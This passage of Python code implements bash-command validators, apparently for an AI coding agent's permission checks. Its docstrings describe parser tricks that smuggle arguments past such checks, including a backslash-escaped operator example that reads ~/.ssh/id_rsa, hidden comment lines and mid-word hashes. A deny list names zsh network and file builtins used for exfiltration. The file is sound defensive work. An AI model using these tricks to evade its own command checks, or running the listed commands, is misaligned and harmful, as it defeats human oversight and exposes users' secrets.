    """Reject ``\\;`` / ``\\|`` / ``\\&`` / ``\\<`` / ``\\>`` outside quotes.

    Mirrors ``hasBackslashEscapedOperator`` L1631-1694. Attack: downstream
    parsers normalize ``cat safe.txt \\; echo ~/.ssh/id_rsa`` into
    ``cat safe.txt ; echo ~/.ssh/id_rsa`` — the re-parse sees two commands
    where bash sees one that reads ``/.ssh/id_rsa`` as a file argument.
    """
    if _has_backslash_escaped(cmd, {";", "|", "&", "<", ">"}):
        return _reject(
            "backslash_escaped_operators",
            cmd,
            "Backslash before a shell operator (double-parse differential)",
            "backslash_operator",
        )
    return _ok("backslash_escaped_operators", cmd)


# --------------------------------------------------------------------------- #
# Validator #19 — brace expansion
# --------------------------------------------------------------------------- #

_QUOTED_BRACE_CHAR = re.compile(r"""['"][{}]['"]""")


def _is_escaped_at(content: str, pos: int) -> bool:
    count = 0
    i = pos - 1
    while i >= 0 and content[i] == "\\":
        count += 1
        i -= 1
    return count % 2 == 1


def _find_matching_close_brace(fu: str, start: int) -> int:
    """Return index of the unescaped ``}`` matching ``fu[start] == '{'``.

    -1 if no balanced closer exists. Brace nesting is honoured; escaped
    braces (preceded by odd backslash count) are skipped.
    """
    depth = 1
    j = start + 1
    while j < len(fu):
        cj = fu[j]
        if cj == "{" and not _is_escaped_at(fu, j):
            depth += 1
        elif cj == "}" and not _is_escaped_at(fu, j):
            depth -= 1
            if depth == 0:
                return j
        j += 1
    return -1


def _brace_range_has_expansion(fu: str, lo: int, hi: int) -> bool:
    """True if ``fu[lo:hi]`` contains a depth-0 ``,`` or ``..`` operator.

    ``lo`` / ``hi`` are the positions of the enclosing ``{`` / ``}``
    (exclusive bounds on the content scanned).
    """
    inner = 0
    k = lo + 1
    while k < hi:
        ck = fu[k]
        if ck == "{" and not _is_escaped_at(fu, k):
            inner += 1
        elif ck == "}" and not _is_escaped_at(fu, k):
            inner -= 1
        elif inner == 0:
            if ck == ",":
                return True
            if ck == "." and k + 1 < hi and fu[k + 1] == ".":
                return True
        k += 1
    return False


def validate_brace_expansion(
    cmd: str, cfg: BashValidatorConfig
) -> ValidationResult:
    """Reject brace expansion with commas / ``..`` ranges.

    Mirrors ``validateBraceExpansion`` L1751-1892. Two classes:

      * Quoted single-brace chars inside an unquoted brace context —
        the attack primitive from CVE discussion in TS comments.
      * Unescaped ``{...,...}`` or ``{N..M}`` — both can resource-exhaust
        (``{1..1000000000}``) AND smuggle args past permission checks.
    """
    fu, _ = _extract_unquoted(cmd)

    # Count unescaped braces
    open_b = sum(
        1
        for i, c in enumerate(fu)
        if c == "{" and not _is_escaped_at(fu, i)
    )
    close_b = sum(
        1
        for i, c in enumerate(fu)
        if c == "}" and not _is_escaped_at(fu, i)
    )
    if open_b > 0 and close_b > open_b:
        return _reject(
            "brace_expansion",
            cmd,
            "Excess closing braces after quote stripping (obfuscation)",
            "brace_expansion",
        )

    if open_b > 0 and _QUOTED_BRACE_CHAR.search(cmd):
        return _reject(
            "brace_expansion",
            cmd,
            "Quoted brace character inside brace-expansion context",
            "brace_expansion",
        )

    # Scan for brace expansion with `,` or `..` at depth 0
    i = 0
    while i < len(fu):
        if fu[i] != "{" or _is_escaped_at(fu, i):
            i += 1
            continue
        match_close = _find_matching_close_brace(fu, i)
        if match_close == -1:
            i += 1
            continue
        if _brace_range_has_expansion(fu, i, match_close):
            return _reject(
                "brace_expansion",
                cmd,
                "Brace expansion could alter command parsing / exhaust resources",
                "brace_expansion",
            )
        i = match_close + 1

    return _ok("brace_expansion", cmd)


# --------------------------------------------------------------------------- #
# Validator #20 — unicode whitespace
# --------------------------------------------------------------------------- #

_UNICODE_WS = re.compile(
    "["
    "\u00a0"  # NBSP
    "\u1680"  # OGHAM SPACE MARK
    "\u2000-\u200a"
    "\u2028\u2029"  # LINE/PARA SEPARATOR
    "\u202f"
    "\u205f"
    "\u3000"
    "\ufeff"  # ZWNBSP
    "]"
)


def validate_unicode_whitespace(
    cmd: str, cfg: BashValidatorConfig
) -> ValidationResult:
    """Reject Unicode whitespace that masquerades as ASCII space.

    Mirrors ``validateUnicodeWhitespace`` L1902-1917. shell-quote treats
    NBSP/U+2028 as word separators but bash treats them as literal word
    content, creating a classic parser differential. Block all of them.
    """
    if _UNICODE_WS.search(cmd):
        return _reject(
            "unicode_whitespace",
            cmd,
            "Unicode whitespace character (non-ASCII space)",
            "unicode_whitespace",
        )
    return _ok("unicode_whitespace", cmd)


# --------------------------------------------------------------------------- #
# Validator #21 — mid-word hash
# --------------------------------------------------------------------------- #

_MIDWORD_HASH = re.compile(r"\S#")


def validate_mid_word_hash(
    cmd: str, cfg: BashValidatorConfig
) -> ValidationResult:
    """Reject ``cmd#arg`` — mid-word ``#`` is a parser differential.

    Mirrors ``validateMidWordHash`` L1919-1962. shell-quote treats a
    mid-word ``#`` as the start of a comment (everything after is
    discarded), bash treats it as a literal character. Attack: ``ec#ho
    evil`` — downstream validator sees ``ec`` (unknown) + comment, bash
    runs ``ec#ho`` which resolves to ``echo`` if there's a shell alias.

    Excludes ``${#var}`` which is bash string-length syntax.
    """
    _, keep = _extract_unquoted(cmd)
    # Mask ${# so we don't match it
    masked = keep.replace("${#", "___")
    # Join backslash-newline continuations for post-join detection
    joined = re.sub(r"\\+\n", "", masked)
    for s in (masked, joined):
        m = _MIDWORD_HASH.search(s)
        if m:
            return _reject(
                "mid_word_hash",
                cmd,
                "Mid-word # (comment vs literal parser differential)",
                "midword_hash",
            )
    return _ok("mid_word_hash", cmd)


# --------------------------------------------------------------------------- #
# Validator #22 — comment/quote desync
# --------------------------------------------------------------------------- #


def validate_comment_quote_desync(
    cmd: str, cfg: BashValidatorConfig
) -> ValidationResult:
    """Reject quote characters inside a ``#`` comment.

    Mirrors ``validateCommentQuoteDesync`` L1990-2074. Comments contain
    quote chars → downstream quote trackers (which don't know about
    comments) desync and treat subsequent code as "inside quotes",
    hiding it from validators.
    """
    in_sq = False
    in_dq = False
    esc = False
    i = 0
    while i < len(cmd):
        ch = cmd[i]
        if esc:
            esc = False
            i += 1
            continue
        if in_sq:
            if ch == "'":
                in_sq = False
            i += 1
            continue
        if ch == "\\":
            esc = True
            i += 1
            continue
        if in_dq:
            if ch == '"':
                in_dq = False
            i += 1
            continue
        if ch == "'":
            in_sq = True
            i += 1
            continue
        if ch == '"':
            in_dq = True
            i += 1
            continue
        if ch == "#":
            line_end = cmd.find("\n", i)
            if line_end == -1:
                line_end = len(cmd)
            rest = cmd[i + 1 : line_end]
            if "'" in rest or '"' in rest:
                return _reject(
                    "comment_quote_desync",
                    cmd,
                    "Quote character inside a # comment (tracker desync)",
                    "comment_desync",
                )
            i = line_end
        i += 1
    return _ok("comment_quote_desync", cmd)


# --------------------------------------------------------------------------- #
# Validator #23 — quoted newline followed by # line
# --------------------------------------------------------------------------- #


def validate_quoted_newline(
    cmd: str, cfg: BashValidatorConfig
) -> ValidationResult:
    """Reject quoted newlines followed by a ``#``-prefixed next line.

    Mirrors ``validateQuotedNewline`` L2109-2175. stripCommentLines in
    CC's permission flow drops any line whose trimmed form starts with
    ``#`` — a quoted newline lets the attacker hide arguments on a
    stripped line.
    """
    if "\n" not in cmd or "#" not in cmd:
        return _ok("quoted_newline", cmd)

    in_sq = False
    in_dq = False
    esc = False
    for i, ch in enumerate(cmd):
        if esc:
            esc = False
            continue
        if ch == "\\" and not in_sq:
            esc = True
            continue
        if ch == "'" and not in_dq:
            in_sq = not in_sq
            continue
        if ch == '"' and not in_sq:
            in_dq = not in_dq
            continue
        if ch == "\n" and (in_sq or in_dq):
            line_start = i + 1
            nxt_nl = cmd.find("\n", line_start)
            line_end = nxt_nl if nxt_nl != -1 else len(cmd)
            next_line = cmd[line_start:line_end]
            if next_line.strip().startswith("#"):
                return _reject(
                    "quoted_newline",
                    cmd,
                    "Quoted newline before a #-prefixed next line",
                    "quoted_newline",
                )
    return _ok("quoted_newline", cmd)


# --------------------------------------------------------------------------- #
# Validator #24 — zsh dangerous commands
# --------------------------------------------------------------------------- #

_ZSH_DANGEROUS: Final[frozenset[str]] = frozenset(
    {
        "zmodload",
        "emulate",
        "sysopen",
        "sysread",
        "syswrite",
        "sysseek",
        "zpty",
        "ztcp",
        "zsocket",
        "mapfile",
        "zf_rm",
        "zf_mv",
        "zf_ln",
        "zf_chmod",
        "zf_chown",
        "zf_mkdir",
        "zf_rmdir",
        "zf_chgrp",
    }
)


def validate_zsh_dangerous_commands(
    cmd: str, cfg: BashValidatorConfig
) -> ValidationResult:
    """Reject zsh builtins that bypass binary-level permission checks.

    Mirrors ``validateZshDangerousCommands`` L2186-2242. ``zmodload``
    loads modules like ``zsh/system`` (raw file I/O) or ``zsh/net/tcp``
    (exfiltration) that sidestep every allowlist targeting ``/usr/bin``
    binaries.
    """
    base = _base_command(cmd)
    if base in _ZSH_DANGEROUS:
        return _reject(
            "zsh_dangerous_commands",
            cmd,
            f"Zsh-specific dangerous command '{base}' bypasses binary permission checks",
            "zsh_module",
        )

    trimmed = cmd.strip()
    if base == "fc" and re.search(r"\s-\S*e", trimmed):
        return _reject(
            "zsh_dangerous_commands",
            cmd,
            "fc -e invokes an editor (eval-equivalent)",
            "zsh_module",
        )

    # Block bare `zsh -c ...` and always construct
    if re.search(r"\}\s*always\s*\{", cmd):
        return _reject(
            "zsh_dangerous_commands",
            cmd,
            "Zsh try/always construct",
            "zsh_module",
        )
    return _ok("zsh_dangerous_commands", cmd)


# --------------------------------------------------------------------------- #
# Default chain order
# --------------------------------------------------------------------------- #


DEFAULT_VALIDATOR_CHAIN: tuple[Validator, ...] = (
    validate_empty,
    validate_length,
    validate_incomplete_commands,
    validate_safe_command_substitution,
    validate_git_commit,
    validate_jq_command,
    validate_shell_metacharacters,
    validate_dangerous_variables,
    validate_dangerous_patterns,
    validate_redirections,
    validate_newlines,
    validate_carriage_return,
    validate_ifs_injection,
    validate_proc_environ_access,
    validate_malformed_token_injection,
    validate_obfuscated_flags,
    validate_backslash_escaped_whitespace,
    validate_backslash_escaped_operators,
    validate_brace_expansion,
    validate_unicode_whitespace,
    validate_mid_word_hash,
    validate_comment_quote_desync,
    validate_quoted_newline,
    validate_zsh_dangerous_commands,
)


# --------------------------------------------------------------------------- #
# Compound splitting
# --------------------------------------------------------------------------- #


def split_compound_command(cmd: str) -> list[str]:
    """Split on ``&&`` / ``||`` / ``;`` / ``|`` at depth 0.

    Mirrors the spirit of ``splitCommand_DEPRECATED`` + the compound walk
    in ``shouldUseSandbox.ts`` L60-69. Does NOT split on lone ``&`` (that
    is background-exec, and the validator applies to the same command
    either way).

    Returns non-empty, non-whitespace subcommands in original order.
    """
    result: list[str] = []
    buf: list[str] = []
    in_sq = False
    in_dq = False
    esc = False
    paren_depth = 0
    i = 0
    while i < len(cmd):
        ch = cmd[i]
        if esc:
            buf.append(ch)
            esc = False
            i += 1
            continue
        if ch == "\\" and not in_sq:
            buf.append(ch)
            esc = True
            i += 1
            continue
        if ch == "'" and not in_dq:
            in_sq = not in_sq
            buf.append(ch)
            i += 1
            continue
        if ch == '"' and not in_sq:
            in_dq = not in_dq
            buf.append(ch)
            i += 1
            continue

        if in_sq or in_dq:
            buf.append(ch)
            i += 1
            continue

        # Subshell/substitution depth
        if ch == "$" and i + 1 < len(cmd) and cmd[i + 1] == "(":
            paren_depth += 1
            buf.append(ch)
            buf.append("(")
            i += 2
            continue
        if ch == "(":
            paren_depth += 1
            buf.append(ch)
            i += 1
            continue
        if ch == ")":
            paren_depth = max(0, paren_depth - 1)
            buf.append(ch)
            i += 1
            continue

        if paren_depth == 0:
            # Check two-char operators first
            if ch == "&" and i + 1 < len(cmd) and cmd[i + 1] == "&":
                result.append("".join(buf).strip())
                buf = []
                i += 2
                continue
            if ch == "|" and i + 1 < len(cmd) and cmd[i + 1] == "|":
                result.append("".join(buf).strip())
                buf = []
                i += 2
                continue
            if ch == ";":
                result.append("".join(buf).strip())
                buf = []
                i += 1
                continue
            if ch == "|":
                result.append("".join(buf).strip())
                buf = []
                i += 1
                continue

        buf.append(ch)
        i += 1

    tail = "".join(buf).strip()
    if tail:
        result.append(tail)
    return [s for s in result if s]


# --------------------------------------------------------------------------- #
# Safe wrapper stripping
# --------------------------------------------------------------------------- #

_ENV_VAR_ASSIGN = re.compile(
    r"^(?:[A-Za-z_][A-Za-z0-9_]*)=[A-Za-z0-9_./:+\-]+[ \t]+"
)
_ENV_WRAPPER = re.compile(r"^env[ \t]+(?:-[a-zA-Z][ \t]+)?")
_TIMEOUT_WRAPPER = re.compile(
    r"^timeout[ \t]+(?:--[a-z-]+(?:=[A-Za-z0-9_.+-]+)?[ \t]+"
    r"|-[ksv](?:[ \t]*[A-Za-z0-9_.+-]+)?[ \t]+)*"
    r"\d+(?:\.\d+)?[smhd]?[ \t]+"
)
_NICE_WRAPPER = re.compile(r"^nice(?:[ \t]+-n[ \t]+-?\d+|[ \t]+-\d+)?[ \t]+")
_NOHUP_WRAPPER = re.compile(r"^nohup[ \t]+(?:--[ \t]+)?")
_IONICE_WRAPPER = re.compile(r"^ionice(?:[ \t]+-[cnt][ \t]*\d+)*[ \t]+")
_CHRT_WRAPPER = re.compile(r"^chrt(?:[ \t]+-[fobi])?(?:[ \t]+\d+)*[ \t]+")
_STDBUF_WRAPPER = re.compile(r"^stdbuf(?:[ \t]+-[ioe][LN0-9]+)+[ \t]+")


def strip_safe_wrappers(cmd: str) -> str:
    """Iteratively strip known-safe command prefixes to a fixed point.

    Mirrors ``stripSafeWrappers`` L524-615 + ``BINARY_HIJACK_VARS``
    handling. Strips (in a fixed-point loop):

      * ``FOO=bar ``  — env var assignments (whitelisted value shape).
      * ``env FOO=bar ...`` — env binary with optional ``-i`` / ``-u``.
      * ``timeout 30s ...``, ``nice -n 19 ...``, ``nohup ...``, ``ionice``,
        ``chrt``, ``stdbuf``.

    Returns the stripped command (right side, trimmed). Does NOT mutate
    the input.
    """
    prev = ""
    current = cmd.lstrip()
    while current != prev:
        prev = current
        # Env var assignment
        m = _ENV_VAR_ASSIGN.match(current)
        if m:
            current = current[m.end() :].lstrip()
            continue
        # env wrapper
        m = _ENV_WRAPPER.match(current)
        if m:
            current = current[m.end() :].lstrip()
            continue
        for pat in (
            _TIMEOUT_WRAPPER,
            _NICE_WRAPPER,
            _NOHUP_WRAPPER,
            _IONICE_WRAPPER,
            _CHRT_WRAPPER,
            _STDBUF_WRAPPER,
        ):
            m = pat.match(current)
            if m:
                current = current[m.end() :].lstrip()
                break
    return current.strip()


# --------------------------------------------------------------------------- #
# Pipeline orchestrator
# --------------------------------------------------------------------------- #


@dataclass
class _Stats:
    total_checks: int = 0
    accepts: int = 0
    rejects: int = 0
    rejects_by_validator: dict[str, int] = field(default_factory=dict)


class BashValidator:
    """Run the validator chain over a full command string.

    Handles compound splitting (``cmd1 && cmd2``) and safe-wrapper
    stripping (``timeout 5 cmd``) before per-subcommand checks. Returns
    the FIRST rejection encountered.

    Per-validator outputs are accessible via :meth:`validate_each`, which
    runs every subcommand through the full chain and returns ALL results
    even after a failure — useful for audit logs and security dashboards.
    """

    def __init__(
        self,
        *,
        chain: tuple[Validator, ...] = DEFAULT_VALIDATOR_CHAIN,
        config: BashValidatorConfig | None = None,
    ) -> None:
        self.chain = chain
        self.config = config or BashValidatorConfig()
        self._stats = _Stats()

    # ------------------------------------------------------------------ #

    def _iter_subcommands(self, command: str) -> list[str]:
        if self.config.split_compound:
            subs = split_compound_command(command)
            if not subs:
                subs = [command]
        else:
            subs = [command]
        if self.config.strip_safe_wrappers:
            stripped: list[str] = []
            for s in subs:
                sw = strip_safe_wrappers(s) or s
                stripped.append(sw)
            # Keep both the raw and the stripped for auditing; the chain
            # runs on the stripped form (that's what actually executes).
            subs = stripped
        return subs

    def _run_chain(self, subcmd: str) -> ValidationResult:
        for validator in self.chain:
            self._stats.total_checks += 1
            result = validator(subcmd, self.config)
            if not result.ok:
                self._stats.rejects += 1
                self._stats.rejects_by_validator[result.validator] = (
                    self._stats.rejects_by_validator.get(result.validator, 0) + 1
                )
                return result
            self._stats.accepts += 1
        return _ok("all", subcmd, "all validators passed")

    def validate(self, command: str) -> ValidationResult:
        """Run the full pipeline; return the first rejection, else ok."""
        if not command or not command.strip():
            # Empty command is explicitly rejected by validate_empty.
            self._stats.total_checks += 1
            self._stats.rejects += 1
            self._stats.rejects_by_validator["empty"] = (
                self._stats.rejects_by_validator.get("empty", 0) + 1
            )
            return _reject(
                "empty", command, "Empty or whitespace-only command", "empty"
            )

        for sub in self._iter_subcommands(command):
            if not sub:
                continue
            result = self._run_chain(sub)
            if not result.ok:
                return result
        return _ok("all", command, "all subcommands passed")

    def validate_each(self, command: str) -> list[ValidationResult]:
        """Return the chain verdict for EACH subcommand, even after failure."""
        results: list[ValidationResult] = []
        subs = self._iter_subcommands(command) if command.strip() else []
        for sub in subs:
            if not sub:
                continue
            results.append(self._run_chain(sub))
        if not results and not command.strip():
            results.append(
                _reject(
                    "empty", command, "Empty or whitespace-only command", "empty"
                )
            )
        return results

    def stats(self) -> dict[str, int]:
        """Return running counters. Keys: ``total_checks`` / ``accepts`` /
        ``rejects`` / ``rejects_by_<validator_name>``."""
        out: dict[str, int] = {
            "total_checks": self._stats.total_checks,
            "accepts": self._stats.accepts,
            "rejects": self._stats.rejects,
        }
        for name, count in self._stats.rejects_by_validator.items():
            out[f"rejects_by_{name}"] = count
        return out
